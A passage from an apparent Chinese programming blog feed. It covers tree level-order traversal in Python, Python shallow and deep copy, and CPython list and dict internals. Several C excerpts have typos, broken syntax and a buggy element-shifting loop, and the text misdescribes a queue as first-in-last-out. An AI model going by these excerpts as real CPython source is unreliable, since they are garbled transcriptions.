<h2 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h2><p>层次遍历即一层一层的遍历，有很多变体<br><a href="https://lintcode.com/problem/binary-tree-level-order-traversal" target="_blank" rel="noopener">https://lintcode.com/problem/binary-tree-level-order-traversal</a><br><a href="http://lintcode.com/zh-cn/problem/binary-tree-zigzag-level-order-traversal/" target="_blank" rel="noopener">http://lintcode.com/zh-cn/problem/binary-tree-zigzag-level-order-traversal/</a></p>
<h3 id="代码实现-用level和pre-level"><a href="#代码实现-用level和pre-level" class="headerlink" title="代码实现(用level和pre_level)"></a>代码实现(用level和pre_level)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 49 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = [[root.val]]</span><br><span class="line">    pre_level = [root] <span class="comment"># pre_level是上一层的结点list</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">        level = [] <span class="comment"># level是当前层的结点list</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> pre_level:</span><br><span class="line">            <span class="keyword">if</span> item.left:</span><br><span class="line">                level.append(item.left)</span><br><span class="line">            <span class="keyword">if</span> item.right:</span><br><span class="line">                level.append(item.right)</span><br><span class="line">         <span class="keyword">if</span> level == []:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pre_level = level</span><br><span class="line">        ans.append([i.val <span class="keyword">for</span> i <span class="keyword">in</span> level])</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<h3 id="代码实现-用queue"><a href="#代码实现-用queue" class="headerlink" title="代码实现(用queue)"></a>代码实现(用queue)</h3><p>因为该层次遍历是先进后出的方式，所以可以使用queue<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 59 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self,root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    queue = [root]</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">while</span>(queue != []):</span><br><span class="line">        level = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(queue)):</span><br><span class="line">            <span class="keyword">if</span> queue[<span class="number">0</span>].left:</span><br><span class="line">                queue.append(queue[<span class="number">0</span>].left)</span><br><span class="line">            <span class="keyword">if</span> queue[<span class="number">0</span>].right:</span><br><span class="line">                queue.append(queue[<span class="number">0</span>].right)</span><br><span class="line">            level.append( queue.pop(<span class="number">0</span>).val )</span><br><span class="line">        ans.append(level)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>还有更多的问题 <a href="https://leetcode.com/problemset/all/?search=traversal" target="_blank" rel="noopener">https://leetcode.com/problemset/all/?search=traversal</a></p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python深拷贝浅拷贝]]></title>
      <url>/2017/10/22/Python/Python%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%B5%85%E6%8B%B7%E8%B4%9D/</url>
      <content type="html"><![CDATA[<h2 id="Python中的深拷贝与浅拷贝"><a href="#Python中的深拷贝与浅拷贝" class="headerlink" title="Python中的深拷贝与浅拷贝"></a>Python中的深拷贝与浅拷贝</h2><a id="more"></a>
<blockquote>
<p>深拷贝: 对对象资源的拷贝 ； 浅拷贝：对引用的拷贝</p>
<h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2></blockquote>
<h3 id="修改不可变对象-string-tuple-需要开辟新的空间"><a href="#修改不可变对象-string-tuple-需要开辟新的空间" class="headerlink" title="修改不可变对象(string, tuple)需要开辟新的空间"></a>修改不可变对象(string, tuple)需要开辟新的空间</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">"hello"</span></span><br><span class="line">&gt;&gt;&gt;id(a)</span><br><span class="line"><span class="number">74243288L</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;a=<span class="string">"world"</span></span><br><span class="line">&gt;&gt;&gt;id(a)</span><br><span class="line"><span class="number">101377648L</span></span><br></pre></td></tr></table></figure>
<h3 id="修改可变对象-list等-不需要开辟新空间"><a href="#修改可变对象-list等-不需要开辟新空间" class="headerlink" title="修改可变对象(list等) 不需要开辟新空间"></a>修改可变对象(list等) 不需要开辟新空间</h3><p>当对数组进行赋值的时候 b = a[:] 仅仅复制了容器中元素的地址,也就是说</p>
<p>如果a中元素是不可变元素的话，对a中元素的修改<strong>不会</strong>影响到b</p>
<p>如果a中的元素是可变元素的话，对a中元素的修改<strong>会</strong>影响到b</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;b=a[:]</span><br><span class="line">&gt;&gt;&gt;id(a),id(b)</span><br><span class="line">(<span class="number">101391816L</span>, <span class="number">74828616L</span>)</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line">[<span class="number">38560888L</span>, <span class="number">38560864L</span>, <span class="number">38560840L</span>]</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> b]</span><br><span class="line">[<span class="number">38560888L</span>, <span class="number">38560864L</span>, <span class="number">38560840L</span>]</span><br><span class="line">&gt;&gt;&gt;a[<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> a</span><br><span class="line">[<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> b</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## case 2</span></span><br><span class="line">&gt;&gt;&gt;a=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">&gt;&gt;&gt;b=a[:]</span><br><span class="line">&gt;&gt;&gt;a[<span class="number">0</span>].append(<span class="number">4</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> a</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> b</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br></pre></td></tr></table></figure>
<p>从上述例子可以看出，未修改之前a和b中元素的地址相同，修改a中不可变元素的时候，元素地址发生了变化，而b中仍是原来的地址，故b仍与变化前的a相同。而修改a中可变元素的时候，该元素在原来的地址上发生变化，b也随之变化。</p>
<h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><p>完全拷贝了一个副本，容器内部元素地址都不一样<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## case1 修改其中不可变元素时，结果与浅拷贝一样</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line">&gt;&gt;&gt;a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;b=deepcopy(a)</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line">[<span class="number">38560888L</span>, <span class="number">38560864L</span>, <span class="number">38560840L</span>]</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> b]</span><br><span class="line">[<span class="number">38560888L</span>, <span class="number">38560864L</span>, <span class="number">38560840L</span>]</span><br><span class="line">&gt;&gt;&gt;a[<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> a</span><br><span class="line">[<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> b</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## case 2</span></span><br><span class="line">&gt;&gt;&gt;a=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">&gt;&gt;&gt;b=deepcopy(a)</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line">[<span class="number">74725064L</span>]</span><br><span class="line">&gt;&gt;&gt;[id(x) <span class="keyword">for</span> x <span class="keyword">in</span> b]</span><br><span class="line">[<span class="number">101137544L</span>]</span><br><span class="line">&gt;&gt;&gt;a[<span class="number">0</span>].append(<span class="number">4</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> a</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> b</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure></p>
<p>从这里可以看出，b是一个完全的副本，元素地址与a均不相同，a修改不影响b</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>深拷贝和浅拷贝，对不可变变量效果无异，因为修改不可变变量对象相当于修改了元素地址。而对于可变变量(list)，深拷贝浅拷贝的差异就体现出来了，浅拷贝只复制了元素地址，即<strong>新的容器指向了旧的元素</strong>，而深拷贝是新开辟了地址，其值与旧元素的相同，<strong>新的容器指向了新的元素</strong>.</p>
]]></content>
      
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[List,Dict,Set]]></title>
      <url>/2017/07/01/Python/List,Dict,Tuple/</url>
      <content type="html"><![CDATA[<p>读python源码剖析,认识List Dict Set是如何实现的</p>
<a id="more"></a>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p>python中的list对象可以有效的支持元素的插入添加和删除，它与C++中的STL的vector是类似的。首先来看一下PyListObject的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  PyObject_VAR_HEAD</span><br><span class="line">  PyObject **ob_item; <span class="comment">//指向元素列表的指针</span></span><br><span class="line">  <span class="keyword">int</span> allocated;</span><br><span class="line">&#125;PyListObject;</span><br></pre></td></tr></table></figure>
<p>在Pyobject_VAR_HEAD中有一个ob_size,它和allocated的关系是什么？</p>
<p>这两个变量和PyListObject对象的内存管理有关，她并不是存了多少东西就申请对应大小的内存，每次需要申请内存的时候PyListObject总会申请一大块内存，这时候申请的总内存的大小记录在allocated中，而实际使用的内存数量记录在ob_size中</p>
<blockquote>
<p>这里ob_size和allocated的关系就像C++中vector的size和capacity的关系</p>
</blockquote>
<h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>Python提供了唯一的途径PyList_New来创建列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PyObject * <span class="title">PyList_New</span><span class="params">(<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">  PyListObject *op;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//内存数量计算，溢出检查</span></span><br><span class="line">  nbytes = size * <span class="keyword">sizeof</span>(PyObject*);</span><br><span class="line">  <span class="keyword">if</span>(nbytes/<span class="keyword">sizeof</span>(PyObject *) != (<span class="keyword">size_t</span>)size)</span><br><span class="line">    <span class="keyword">return</span> PyErr_NoMemory();</span><br><span class="line">	</span><br><span class="line">  <span class="comment">//为PyListObject对象申请空间</span></span><br><span class="line">  <span class="keyword">if</span>(num_free_lists)&#123; <span class="comment">//缓冲池可用</span></span><br><span class="line">    num_free_lists--;</span><br><span class="line">    op = free_lists[num_free_lists];</span><br><span class="line">    _Py_NewReference((PyObject *)op);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//缓冲池不可用</span></span><br><span class="line">    op = PyObject_GC_New(PyListObject, &amp; PyList_Type);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//为PyListObject对象中维护的元素列表申请空间</span></span><br><span class="line">  <span class="keyword">if</span>(size&lt;=<span class="number">0</span>)</span><br><span class="line">    op-&gt;ob_item = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    op-&gt;ob.item = (PyObject **)PyMem_MALLOC(nbytes);</span><br><span class="line">    <span class="built_in">memset</span>(op-&gt;op_item,<span class="number">0</span>,nbytes);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  op-&gt;ob_size = size;</span><br><span class="line">  op-&gt;allocated = size;</span><br><span class="line">  <span class="keyword">return</span> (PyObject *)op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="设置元素"><a href="#设置元素" class="headerlink" title="设置元素"></a>设置元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PyList_SetItem</span><span class="params">(<span class="keyword">register</span> PyObject *op, <span class="keyword">register</span> <span class="keyword">int</span> i, <span class="keyword">register</span> PyObject *newitem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">register</span> PyObject *olditem;</span><br><span class="line">  <span class="keyword">register</span> PyObject ** p;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">//检查索引</span></span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">0</span> ||i &gt;= (PyListObject*)op)-&gt;ob_size )&#123;</span><br><span class="line">    PyErr_SetString(PyExc_indexError,<span class="string">"list assignment index out of range"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//设置元素</span></span><br><span class="line">  p = ((PyListObject *)op) -&gt; ob_item + i;</span><br><span class="line">  olditem = *p;</span><br><span class="line">  *p =  newitem;</span><br><span class="line">  Py_XDECRTF(olditem);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><p>设置元素和插入元素动作是不同的，设置元素不会导致ob_item指向的内存发生变化，而插入元素的动作则很有可能使得ob_item指向的内存发生变化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PyList_Insert</span><span class="params">(PyObject *op, Py_ssize_t where, PyObject *newitem</span></span></span><br><span class="line"><span class="function"><span class="params">&#123;</span></span></span><br><span class="line"><span class="function"><span class="params"> 	....<span class="comment">//类型检查</span></span></span></span><br><span class="line">  return ins1((PyListObject *)op, where, newitem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ins1</span><span class="params">(PyListObject *self, Py_ssize_t where, PyObject *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Py_ssize_t i, n=self-&gt;ob.size;</span><br><span class="line">  PyObject **items;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//调整列表容量</span></span><br><span class="line">  <span class="keyword">if</span>(list_resize(self,n+<span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">//确定插入点</span></span><br><span class="line">  <span class="keyword">if</span>(where &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    where += n;</span><br><span class="line">    <span class="keyword">if</span>(where &lt; <span class="number">0</span>)</span><br><span class="line">      where=<span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(where &gt;n)</span><br><span class="line">    where = n;</span><br><span class="line">  </span><br><span class="line">  items = self-&gt;ob_item;</span><br><span class="line">  <span class="keyword">for</span>(i = n; --i&gt; where;)</span><br><span class="line">	items[i+<span class="number">1</span>]=item[i];</span><br><span class="line">	Py_INCREF(v);</span><br><span class="line">  items[where]=v;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过list_resize来调整PyListObject对象所维护的列表的内存时，Python分两种情况处理：</p>
<ol>
<li><code>newsize&lt;allocated &amp;&amp; newsize&gt;allocated/2</code> : 简单调整ob_size的值</li>
<li>其他情况，调用realloc重新分配空间</li>
</ol>
<p>还有另一种广泛使用的插入操作append，它与insert操作很类似，类型检查等操作之后通过 <code>PyList_SET_ITEM(self,n,v)</code>来把要添加的元素放在第ob_size+1位置上</p>
<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>当python执行list.remove(3)时，PyListObject中的listremove操作会被激活</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> PyObject * <span class="title">listremove</span><span class="params">(PyListObject *self, PyObject *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;self-&gt;ob_size;i++)&#123;</span><br><span class="line">    <span class="keyword">int</span> cmp = PyObjct_RichCompareBool(self-&gt;ob.item[i],v,Py_EQ);</span><br><span class="line">    <span class="keyword">if</span>(cmp&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(list_ass_slice(self,i,i+<span class="number">1</span>,(PyObject *)<span class="literal">NULL</span>)==<span class="number">0</span>)</span><br><span class="line">        Py_RETURN_NONE;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp&lt;<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  PyErr_SetString(PyExc_ValueError, <span class="string">"list.remove(x):x not in list"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Python会对整个列表进行遍历，将待删除的元素与list中每个元素意义比较，如果发现匹配的元素就调用list_ass_slice删除该元素</p>
<p>函数原型为</p>
<p><code>int list_ass_slice(PyListObject *a,Py_ssize_t ilow,Py_ssize_t ihigh,pyObject *v)</code> </p>
<p>它并不是一个专用与删除操作的函数，完整功能是：</p>
<ol>
<li>a[ilow:ihigh] = v if v !=NULL.</li>
<li>del a[ilow:ihigh] if v == NULL</li>
</ol>
<p>当执行lst[1:3]=[‘a’,’b’]时，Python内部就调用了该函数。 在list_ass_slice中当进行元素删除工作时，实际上是通过memmove简单搬移内存来实现的，这意味着当调用list的remove操作删除元素时，一定会触发内存搬移的动作。</p>
<h3 id="PyListObject对象缓冲池"><a href="#PyListObject对象缓冲池" class="headerlink" title="PyListObject对象缓冲池"></a>PyListObject对象缓冲池</h3><p>之前在创建list对象时候用到了free_lists缓冲池，那这个缓冲池是从哪里获得的呢？答案就是在PyListObject被销毁的过程中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_dealloc</span><span class="params">(PyListObject *op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="comment">//销毁PyListObject对象维护的元素列表</span></span><br><span class="line">  <span class="keyword">if</span>(op-ob_item!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    i = op-&gt;ob_size;</span><br><span class="line">    <span class="keyword">while</span>(--i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">      Py_XDECREF(op-&gt;ob_item[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    PyMem_FREE(op-&gt;ob_item);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//释放PyListObject自身内存</span></span><br><span class="line">  <span class="keyword">if</span>(num_free_lists&lt;MAXFREELISTS &amp;&amp; PYLIST_CheckExact(op))</span><br><span class="line">    free_lists[num_free_lists++] = op;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    op-&gt;ob_type-&gt;tp_free((PyObkect*)op);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在创建List的时候我们分为两步，首先创建PyListObject对象，然后创建对象所维护的元素列表ob_item，与之对应在销毁的时候先销毁ob_item再销毁PyListObject对象。 而在释放自身内存的时候，python会先查看缓冲池free_lists是否已经满了，如果没有就把待删除的PyListObject对象放到缓冲池中以备后用。</p>
<p>在Python下次创建新的list时候，这个PyListObject·对象会被重新唤醒，重新分配PyObject*元素列表占用的内存。</p>
<h2 id="Dict"><a href="#Dict" class="headerlink" title="Dict"></a>Dict</h2><p>PyDictObject没有像C++的STL中的map一样使用平衡二元树，而是采用了散列表（hash table），在最优情况下散列表能提供O(1)复杂度的搜索效率。用于映射的函数成为散列函数（hash function），而映射后的值成为元素的散列值（hash value）在散列表的实现中，所选择的散列函数的优劣将直接决定所实现的散列表的搜索效率的高低。</p>
<p>在使用三列表的过程中，不同对象经过连列函数的作用可能映射为相同的散列值，而且随着所需要存储的数据的增多，这样的冲突就会发生的越来越频繁。散列冲突是散列技术与生俱来的问题。这里需要用到<strong>装载率</strong>的概念，装载率是散列表中已经使用的空间和总空间的比值。研究表明当散列表的装载率大于2/3时，散列冲突发生的几率会大大增加。 Python中采用开放定址法来解决散列冲突的问题。</p>
<p>关联容器的entry，我们把关联容器中的一个（键，值）元素称为一个entry，在Python中entry的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Py_ssize_t me_hash;</span><br><span class="line">  PyObject *me_key;</span><br><span class="line">  PyObject *me_value;</span><br><span class="line">&#125;PyDictEntry;</span><br></pre></td></tr></table></figure>
<p>me_hash域存放的是me_key的散列值，利用一个域来记录这个散列值可以避免每次查询的时候都重新计算一遍散列值。</p>
<p>entry一共有三种状态ununsed ，active，dummy</p>
<ul>
<li>Unused态：me_key和me_value都是NULL</li>
<li>Active态：entry中存储了一个（key，value）对</li>
<li>dummy态：当entry中存储的（key，value）被删除后，不能直接从active转为unused态，否则会导致冲突探测链的中断。相反，entry中的me_key指向dummy对象，可以实现“伪删除”技术</li>
</ul>
<h3 id="关联容器的实现"><a href="#关联容器的实现" class="headerlink" title="关联容器的实现"></a>关联容器的实现</h3><p>在Python中关联容器是通过PyDictObject对象来实现的。而一个PyDictObject对象实际上是一大堆entry的集合</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PyDict_MINSIZE 8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">dictobject</span> <span class="title">PyDictObject</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">dictobject</span>&#123;</span></span><br><span class="line">  PyObject_HEAD</span><br><span class="line">  Py_ssize_t ma_fill; <span class="comment">//元素个数 active+dummy</span></span><br><span class="line">  Py_ssize_t ma_used; <span class="comment">//元素个数 active</span></span><br><span class="line">  Py_ssize_t ma_mask; <span class="comment">//记录了PyDictObject对象所拥有的所有entry数量</span></span><br><span class="line">  PyDictEntry *ma_table;</span><br><span class="line">  PyDictEntry *(*ma_lookup)(PyDictObject *mp, PyObject *key, <span class="keyword">long</span> hash);</span><br><span class="line">  